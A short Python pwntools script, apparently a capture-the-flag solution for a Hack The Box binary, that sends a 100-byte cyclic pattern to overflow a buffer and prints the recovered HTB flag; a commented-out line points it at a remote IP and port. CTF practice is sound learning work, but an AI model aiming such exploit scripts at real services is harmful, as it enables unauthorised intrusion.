from pwn import *
import re, os

elf = context.binary = ELF('./gs')

#p = remote('46.101.73.55',32078)
p = process()

offset = 100
payload = cyclic(offset)

p.sendline(payload)
content = p.recvall()
flag = re.findall(r'HTB\{.*\}', str(content))
os.system('clear')
print("\nflag ",flag[0]) 
#p.interactive()

